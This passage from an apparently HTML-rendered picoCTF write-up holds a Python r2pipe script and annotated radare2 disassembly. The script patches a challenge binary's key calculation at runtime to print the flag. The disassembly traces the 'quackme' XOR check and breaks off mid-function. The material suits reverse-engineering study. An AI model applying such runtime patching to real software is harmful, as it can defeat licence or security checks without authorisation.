</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#6272a4">#!/usr/bin/env python</span>

<span style="color:#ff79c6">import</span> r2pipe
<span style="color:#ff79c6">import</span> os
<span style="color:#ff79c6">import</span> re

LOCAL_PATH<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;.&#39;</span>
PRGM<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;be-quick-or-be-dead-3&#39;</span>
BINARY<span style="color:#ff79c6">=</span>os<span style="color:#ff79c6">.</span>path<span style="color:#ff79c6">.</span>join(LOCAL_PATH, PRGM)

KEY <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x221d8eea</span>
ADDRESS <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;sym.calculate_key&#39;</span>

<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">find_return_address</span>(asm):			<span style="color:#6272a4">#Read the disassembled code of a function and return the __ret__ instruction address</span>
    <span style="color:#ff79c6">for</span> line <span style="color:#ff79c6">in</span> asm<span style="color:#ff79c6">.</span>split(<span style="color:#f1fa8c">&#39;</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#39;</span>):
        <span style="color:#ff79c6">if</span> <span style="color:#f1fa8c">&#39;ret&#39;</span> <span style="color:#ff79c6">in</span> line:
            index <span style="color:#ff79c6">=</span> line<span style="color:#ff79c6">.</span>find(<span style="color:#f1fa8c">&#39;0x&#39;</span>)
            <span style="color:#ff79c6">return</span> line[index:index<span style="color:#ff79c6">+</span><span style="color:#bd93f9">10</span>]

<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">debug</span>():
    r2 <span style="color:#ff79c6">=</span> r2pipe<span style="color:#ff79c6">.</span>open(BINARY)
    r2<span style="color:#ff79c6">.</span>cmd(<span style="color:#f1fa8c">&#39;aa&#39;</span>)                                    <span style="color:#6272a4">#Analyze symbols</span>
    asm <span style="color:#ff79c6">=</span> r2<span style="color:#ff79c6">.</span>cmd(<span style="color:#f1fa8c">&#39;pdf @ </span><span style="color:#f1fa8c">%s</span><span style="color:#f1fa8c">&#39;</span> <span style="color:#ff79c6">%</span> ADDRESS)              <span style="color:#6272a4">#store the disassembled code in asm</span>
    r2<span style="color:#ff79c6">.</span>cmd(<span style="color:#f1fa8c">&#39;ood&#39;</span>)                                   <span style="color:#6272a4">#enable debug mode</span>
    r2<span style="color:#ff79c6">.</span>cmd(<span style="color:#f1fa8c">&#39;db </span><span style="color:#f1fa8c">%s</span><span style="color:#f1fa8c">&#39;</span> <span style="color:#ff79c6">%</span> ADDRESS)                       <span style="color:#6272a4">#set a breakpoint at sym.calculate_key</span>
    r2<span style="color:#ff79c6">.</span>cmd(<span style="color:#f1fa8c">&#39;dc&#39;</span>)                                    <span style="color:#6272a4">#run until the breakpoint is reached</span>
    r2<span style="color:#ff79c6">.</span>cmd(<span style="color:#f1fa8c">&#39;dr eax=</span><span style="color:#f1fa8c">%s</span><span style="color:#f1fa8c">&#39;</span> <span style="color:#ff79c6">%</span> KEY)                       <span style="color:#6272a4">#set the KEY as the returned value</span>
    r2<span style="color:#ff79c6">.</span>cmd(<span style="color:#f1fa8c">&#39;dr rip=</span><span style="color:#f1fa8c">%s</span><span style="color:#f1fa8c">&#39;</span> <span style="color:#ff79c6">%</span> find_return_address(asm))  <span style="color:#6272a4">#change rip to point to &#39;ret&#39; instruction</span>
    <span style="color:#ff79c6">return</span> r2<span style="color:#ff79c6">.</span>cmd(<span style="color:#f1fa8c">&#39;dc&#39;</span>)                             <span style="color:#6272a4">#continue the programme execution</span>

<span style="color:#8be9fd;font-style:italic">print</span> <span style="color:#f1fa8c">&#39;&#39;</span>
<span style="color:#8be9fd;font-style:italic">print</span> re<span style="color:#ff79c6">.</span>findall(<span style="color:#f1fa8c">&#39;picoCTF{.*}&#39;</span>,debug())[<span style="color:#bd93f9">0</span>]
</code></pre></td></tr></table>
</div>
</div><h2 id="quackme">quackme</h2>
<ul>
<li><a href="./resources/quackme/main">main</a></li>
</ul>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">51
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">52
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">53
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">54
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">55
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">56
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">57
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">58
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">59
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">60
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">61
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">62
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">63
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">64
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">65
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">66
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">67
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">68
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">69
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">70
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">71
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">72
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">73
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">74
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">75
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">76
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">77
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm">/ 211: <span style="color:#50fa7b">sym.do_magic</span> ()<span style="color:#6272a4">;</span>
|           <span style="color:#6272a4">; var int32_t var_1dh @ ebp-0x1d</span>
|           <span style="color:#6272a4">; var int32_t zero_var @ ebp-0x1c</span>
|           <span style="color:#6272a4">; var int32_t cpt @ ebp-0x18</span>
|           <span style="color:#6272a4">; var int32_t our_input @ ebp-0x14</span>
|           <span style="color:#6272a4">; var int32_t length_of_our_input @ ebp-0x10</span>
|           <span style="color:#6272a4">; var int32_t memory_of_our_input @ ebp-0xc</span>
|           <span style="color:#6272a4">; CALL XREF from main @ 0x804874a</span>
|           0<span style="color:#50fa7b">x08048642</span>      <span style="color:#bd93f9">55</span>             <span style="color:#8be9fd;font-style:italic">push</span> <span style="color:#8be9fd;font-style:italic">ebp</span>
|           0<span style="color:#50fa7b">x08048643</span>      <span style="color:#bd93f9">89</span><span style="color:#8be9fd;font-style:italic">e5</span>           <span style="color:#8be9fd;font-style:italic">mov</span> <span style="color:#8be9fd;font-style:italic">ebp</span>, <span style="color:#8be9fd;font-style:italic">esp</span>
|           0<span style="color:#50fa7b">x08048645</span>      <span style="color:#bd93f9">83</span><span style="color:#8be9fd;font-style:italic">ec28</span>         <span style="color:#8be9fd;font-style:italic">sub</span> <span style="color:#8be9fd;font-style:italic">esp</span>, <span style="color:#bd93f9">0x28</span>
|           0<span style="color:#50fa7b">x08048648</span>      <span style="color:#8be9fd;font-style:italic">e88effffff</span>     <span style="color:#8be9fd;font-style:italic">call</span> <span style="color:#8be9fd;font-style:italic">sym.read_input</span>
|           0<span style="color:#50fa7b">x0804864d</span>      <span style="color:#bd93f9">8945</span><span style="color:#8be9fd;font-style:italic">ec</span>         <span style="color:#8be9fd;font-style:italic">mov</span> <span style="color:#8be9fd">dword</span> [<span style="color:#8be9fd;font-style:italic">our_input</span>], <span style="color:#8be9fd;font-style:italic">eax</span>
|           0<span style="color:#50fa7b">x08048650</span>      <span style="color:#bd93f9">83</span><span style="color:#8be9fd;font-style:italic">ec0c</span>         <span style="color:#8be9fd;font-style:italic">sub</span> <span style="color:#8be9fd;font-style:italic">esp</span>, <span style="color:#bd93f9">0xc</span>
|           0<span style="color:#50fa7b">x08048653</span>      <span style="color:#8be9fd;font-style:italic">ff75ec</span>         <span style="color:#8be9fd;font-style:italic">push</span> <span style="color:#8be9fd">dword</span> [<span style="color:#8be9fd;font-style:italic">our_input</span>]
|           0<span style="color:#50fa7b">x08048656</span>      <span style="color:#8be9fd;font-style:italic">e835feffff</span>     <span style="color:#8be9fd;font-style:italic">call</span> <span style="color:#8be9fd;font-style:italic">sym.imp.strlen</span>         			<span style="color:#6272a4">; size_t strlen(const char *s)</span>
|           0<span style="color:#50fa7b">x0804865b</span>      <span style="color:#bd93f9">83</span><span style="color:#8be9fd;font-style:italic">c410</span>         <span style="color:#8be9fd;font-style:italic">add</span> <span style="color:#8be9fd;font-style:italic">esp</span>, <span style="color:#bd93f9">0x10</span>
|           0<span style="color:#50fa7b">x0804865e</span>      <span style="color:#bd93f9">8945</span><span style="color:#8be9fd;font-style:italic">f0</span>         <span style="color:#8be9fd;font-style:italic">mov</span> <span style="color:#8be9fd">dword</span> [<span style="color:#8be9fd;font-style:italic">length_of_our_input</span>], <span style="color:#8be9fd;font-style:italic">eax</span>
|           0<span style="color:#50fa7b">x08048661</span>      <span style="color:#bd93f9">8</span><span style="color:#8be9fd;font-style:italic">b45f0</span>         <span style="color:#8be9fd;font-style:italic">mov</span> <span style="color:#8be9fd;font-style:italic">eax</span>, <span style="color:#8be9fd">dword</span> [<span style="color:#8be9fd;font-style:italic">length_of_our_input</span>]
|           0<span style="color:#50fa7b">x08048664</span>      <span style="color:#bd93f9">83</span><span style="color:#8be9fd;font-style:italic">c001</span>         <span style="color:#8be9fd;font-style:italic">add</span> <span style="color:#8be9fd;font-style:italic">eax</span>, <span style="color:#bd93f9">1</span>					<span style="color:#6272a4">; eax = length_of_our_input + 1</span>
|           0<span style="color:#50fa7b">x08048667</span>      <span style="color:#bd93f9">83</span><span style="color:#8be9fd;font-style:italic">ec0c</span>         <span style="color:#8be9fd;font-style:italic">sub</span> <span style="color:#8be9fd;font-style:italic">esp</span>, <span style="color:#bd93f9">0xc</span>
|           0<span style="color:#50fa7b">x0804866a</span>      <span style="color:#bd93f9">50</span>             <span style="color:#8be9fd;font-style:italic">push</span> <span style="color:#8be9fd;font-style:italic">eax</span>
|           0<span style="color:#50fa7b">x0804866b</span>      <span style="color:#8be9fd;font-style:italic">e8f0fdffff</span>     <span style="color:#8be9fd;font-style:italic">call</span> <span style="color:#8be9fd;font-style:italic">sym.imp.malloc</span>         			<span style="color:#6272a4">;  void *malloc(size_t size)  ; malloc(length_of_our_input + 1)</span>
|           0<span style="color:#50fa7b">x08048670</span>      <span style="color:#bd93f9">83</span><span style="color:#8be9fd;font-style:italic">c410</span>         <span style="color:#8be9fd;font-style:italic">add</span> <span style="color:#8be9fd;font-style:italic">esp</span>, <span style="color:#bd93f9">0x10</span>
|           0<span style="color:#50fa7b">x08048673</span>      <span style="color:#bd93f9">8945</span><span style="color:#8be9fd;font-style:italic">f4</span>         <span style="color:#8be9fd;font-style:italic">mov</span> <span style="color:#8be9fd">dword</span> [<span style="color:#8be9fd;font-style:italic">memory_of_our_input</span>], <span style="color:#8be9fd;font-style:italic">eax</span>		<span style="color:#6272a4">;memory_of_our_input &lt;- length_of_our_input + 1</span>
|           0<span style="color:#50fa7b">x08048676</span>      <span style="color:#bd93f9">837</span><span style="color:#8be9fd;font-style:italic">df400</span>       <span style="color:#8be9fd;font-style:italic">cmp</span> <span style="color:#8be9fd">dword</span> [<span style="color:#8be9fd;font-style:italic">memory_of_our_input</span>], <span style="color:#bd93f9">0</span>		<span style="color:#6272a4">;if memory_of_our_input == 0x0</span>
|       ,=&lt; 0<span style="color:#50fa7b">x0804867a</span>      <span style="color:#bd93f9">751</span><span style="color:#8be9fd;font-style:italic">a</span>           <span style="color:#8be9fd;font-style:italic">jne</span> <span style="color:#bd93f9">0x8048696</span>					<span style="color:#6272a4">;then Out_Of_Memory</span>
|       |   0<span style="color:#50fa7b">x0804867c</span>      <span style="color:#bd93f9">83</span><span style="color:#8be9fd;font-style:italic">ec0c</span>         <span style="color:#8be9fd;font-style:italic">sub</span> <span style="color:#8be9fd;font-style:italic">esp</span>, <span style="color:#bd93f9">0xc</span>
|       |   0<span style="color:#50fa7b">x0804867f</span>      <span style="color:#bd93f9">6884880408</span>     <span style="color:#8be9fd;font-style:italic">push</span> <span style="color:#8be9fd;font-style:italic">str.malloc___returned_NULL._Out_of_Memory</span> <span style="color:#6272a4">;</span>
|       |   0<span style="color:#50fa7b">x08048684</span>      <span style="color:#8be9fd;font-style:italic">e8e7fdffff</span>     <span style="color:#8be9fd;font-style:italic">call</span> <span style="color:#8be9fd;font-style:italic">sym.imp.puts</span>
|       |   0<span style="color:#50fa7b">x08048689</span>      <span style="color:#bd93f9">83</span><span style="color:#8be9fd;font-style:italic">c410</span>         <span style="color:#8be9fd;font-style:italic">add</span> <span style="color:#8be9fd;font-style:italic">esp</span>, <span style="color:#bd93f9">0x10</span>
|       |   0<span style="color:#50fa7b">x0804868c</span>      <span style="color:#bd93f9">83</span><span style="color:#8be9fd;font-style:italic">ec0c</span>         <span style="color:#8be9fd;font-style:italic">sub</span> <span style="color:#8be9fd;font-style:italic">esp</span>, <span style="color:#bd93f9">0xc</span>
|       |   0<span style="color:#50fa7b">x0804868f</span>      <span style="color:#bd93f9">6</span><span style="color:#8be9fd;font-style:italic">aff</span>           <span style="color:#8be9fd;font-style:italic">push</span> <span style="color:#bd93f9">0xffffffffffffffff</span>
|       |   0<span style="color:#50fa7b">x08048691</span>      <span style="color:#8be9fd;font-style:italic">e8eafdffff</span>     <span style="color:#8be9fd;font-style:italic">call</span> <span style="color:#8be9fd;font-style:italic">sym.imp.exit</span>           			<span style="color:#6272a4">; void exit(int status)</span>
|       `-&gt; 0<span style="color:#50fa7b">x08048696</span>      <span style="color:#bd93f9">8</span><span style="color:#8be9fd;font-style:italic">b45f0</span>         <span style="color:#8be9fd;font-style:italic">mov</span> <span style="color:#8be9fd;font-style:italic">eax</span>, <span style="color:#8be9fd">dword</span> [<span style="color:#8be9fd;font-style:italic">length_of_our_input</span>]		<span style="color:#6272a4">;if memory_of_our_input != 0x0</span>
|           0<span style="color:#50fa7b">x08048699</span>      <span style="color:#bd93f9">83</span><span style="color:#8be9fd;font-style:italic">c001</span>         <span style="color:#8be9fd;font-style:italic">add</span> <span style="color:#8be9fd;font-style:italic">eax</span>, <span style="color:#bd93f9">1</span>						<span style="color:#6272a4">;eax = length_of_our_input + 1</span>
|           0<span style="color:#50fa7b">x0804869c</span>      <span style="color:#bd93f9">83</span><span style="color:#8be9fd;font-style:italic">ec04</span>         <span style="color:#8be9fd;font-style:italic">sub</span> <span style="color:#8be9fd;font-style:italic">esp</span>, <span style="color:#bd93f9">4</span>
|           0<span style="color:#50fa7b">x0804869f</span>      <span style="color:#bd93f9">50</span>             <span style="color:#8be9fd;font-style:italic">push</span> <span style="color:#8be9fd;font-style:italic">eax</span>
|           0<span style="color:#50fa7b">x080486a0</span>      <span style="color:#bd93f9">6</span><span style="color:#8be9fd;font-style:italic">a00</span>           <span style="color:#8be9fd;font-style:italic">push</span> <span style="color:#bd93f9">0</span>
|           0<span style="color:#50fa7b">x080486a2</span>      <span style="color:#8be9fd;font-style:italic">ff75f4</span>         <span style="color:#8be9fd;font-style:italic">push</span> <span style="color:#8be9fd">dword</span> [<span style="color:#8be9fd;font-style:italic">memory_of_our_input</span>]
|           0<span style="color:#50fa7b">x080486a5</span>      <span style="color:#8be9fd;font-style:italic">e816feffff</span>     <span style="color:#8be9fd;font-style:italic">call</span> <span style="color:#8be9fd;font-style:italic">sym.imp.memset</span>         			<span style="color:#6272a4">; void *memset(memory_of_our_input, 0x0, length_of_our_input+1)  # initialised with 0x0</span>
|           0<span style="color:#50fa7b">x080486aa</span>      <span style="color:#bd93f9">83</span><span style="color:#8be9fd;font-style:italic">c410</span>         <span style="color:#8be9fd;font-style:italic">add</span> <span style="color:#8be9fd;font-style:italic">esp</span>, <span style="color:#bd93f9">0x10</span>
|           0<span style="color:#50fa7b">x080486ad</span>      <span style="color:#8be9fd;font-style:italic">c745e4000000.</span>  <span style="color:#8be9fd;font-style:italic">mov</span> <span style="color:#8be9fd">dword</span> [<span style="color:#8be9fd;font-style:italic">zero_var</span>], <span style="color:#bd93f9">0</span>			<span style="color:#6272a4">; zero_var = 0</span>
|           0<span style="color:#50fa7b">x080486b4</span>      <span style="color:#8be9fd;font-style:italic">c745e8000000.</span>  <span style="color:#8be9fd;font-style:italic">mov</span> <span style="color:#8be9fd">dword</span> [<span style="color:#8be9fd;font-style:italic">cpt</span>], <span style="color:#bd93f9">0</span>				<span style="color:#6272a4">; cpt = 0</span>
|       ,=&lt; 0<span style="color:#50fa7b">x080486bb</span>      <span style="color:#8be9fd;font-style:italic">eb4e</span>           <span style="color:#8be9fd;font-style:italic">jmp</span> <span style="color:#bd93f9">0x804870b</span>
<span style="color:#6272a4">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span>
|      <span style="color:#50fa7b">.</span><span style="color:#ff79c6">--&gt;</span> <span style="color:#bd93f9">0x080486bd</span>      <span style="color:#bd93f9">8</span><span style="color:#8be9fd;font-style:italic">b45e8</span>         <span style="color:#8be9fd;font-style:italic">mov</span> <span style="color:#8be9fd;font-style:italic">eax</span>, <span style="color:#8be9fd">dword</span> [<span style="color:#8be9fd;font-style:italic">cpt</span>]			<span style="color:#6272a4">;DO {eax = cpt</span>
|      :|   0<span style="color:#50fa7b">x080486c0</span>      <span style="color:#bd93f9">0558880408</span>     <span style="color:#8be9fd;font-style:italic">add</span> <span style="color:#8be9fd;font-style:italic">eax</span>, <span style="color:#8be9fd;font-style:italic">obj.sekrutBuffer</span>   		<span style="color:#6272a4">; eax = adresse of sekrutBuffer[cpt]	;eax = 0x8048858 + cpt; &#34;)\x06\x16O+50\x1eQ\x1b[\x14K\b]+\\x10\x06\x06\x18EQ&#34;</span>
|      :|   0<span style="color:#50fa7b">x080486c5</span>      <span style="color:#bd93f9">0</span><span style="color:#8be9fd;font-style:italic">fb608</span>         <span style="color:#8be9fd;font-style:italic">movzx</span> <span style="color:#8be9fd;font-style:italic">ecx</span>, <span style="color:#8be9fd">byte</span> [<span style="color:#8be9fd;font-style:italic">eax</span>]		<span style="color:#6272a4">; ecx = sekrutBuffer[cpt]</span>
|      :|   0<span style="color:#50fa7b">x080486c8</span>      <span style="color:#bd93f9">8</span><span style="color:#8be9fd;font-style:italic">b55e8</span>         <span style="color:#8be9fd;font-style:italic">mov</span> <span style="color:#8be9fd;font-style:italic">edx</span>, <span style="color:#8be9fd">dword</span> [<span style="color:#8be9fd;font-style:italic">cpt</span>]			<span style="color:#6272a4">; edx = adresse of cpt</span>
|      :|   0<span style="color:#50fa7b">x080486cb</span>      <span style="color:#bd93f9">8</span><span style="color:#8be9fd;font-style:italic">b45ec</span>         <span style="color:#8be9fd;font-style:italic">mov</span> <span style="color:#8be9fd;font-style:italic">eax</span>, <span style="color:#8be9fd">dword</span> [<span style="color:#8be9fd;font-style:italic">our_input</span>]		<span style="color:#6272a4">; eax = adresse of our_input</span>
|      :|   0<span style="color:#50fa7b">x080486ce</span>      <span style="color:#bd93f9">01</span><span style="color:#8be9fd;font-style:italic">d0</span>           <span style="color:#8be9fd;font-style:italic">add</span> <span style="color:#8be9fd;font-style:italic">eax</span>, <span style="color:#8be9fd;font-style:italic">edx</span>				<span style="color:#6272a4">; eax = adresse of our_input[cpt]</span>
|      :|   0<span style="color:#50fa7b">x080486d0</span>      <span style="color:#bd93f9">0</span><span style="color:#8be9fd;font-style:italic">fb600</span>         <span style="color:#8be9fd;font-style:italic">movzx</span> <span style="color:#8be9fd;font-style:italic">eax</span>, <span style="color:#8be9fd">byte</span> [<span style="color:#8be9fd;font-style:italic">eax</span>]		<span style="color:#6272a4">; eax = our_input[cpt]</span>
|      :|   0<span style="color:#50fa7b">x080486d3</span>      <span style="color:#bd93f9">31</span><span style="color:#8be9fd;font-style:italic">c8</span>           <span style="color:#8be9fd;font-style:italic">xor</span> <span style="color:#8be9fd;font-style:italic">eax</span>, <span style="color:#8be9fd;font-style:italic">ecx</span>				<span style="color:#6272a4">; eax = our_input[cpt] XOR sekrutBuffer[cpt]</span>
|      :|   0<span style="color:#50fa7b">x080486d5</span>      <span style="color:#bd93f9">8845</span><span style="color:#8be9fd;font-style:italic">e3</span>         <span style="color:#8be9fd;font-style:italic">mov</span> <span style="color:#8be9fd">byte</span> [<span style="color:#8be9fd;font-style:italic">var_1dh</span>], <span style="color:#8be9fd;font-style:italic">al</span>		<span style="color:#6272a4">; xor_results = eax (al)</span>
|      :|   0<span style="color:#50fa7b">x080486d8</span>      <span style="color:#bd93f9">8</span><span style="color:#8be9fd;font-style:italic">b1538a00408</span>   <span style="color:#8be9fd;font-style:italic">mov</span> <span style="color:#8be9fd;font-style:italic">edx</span>, <span style="color:#8be9fd">dword</span> [<span style="color:#8be9fd;font-style:italic">obj.greetingMessage</span>] <span style="color:#6272a4">; edx = adresse of greetingMessage; [0x804a038:4]=0x80487f0 str.You_have_now_entered_the_Duck_Web__and_you_re_in_for_a_honkin__good_time.__Can_you_figure_out_my_trick</span>
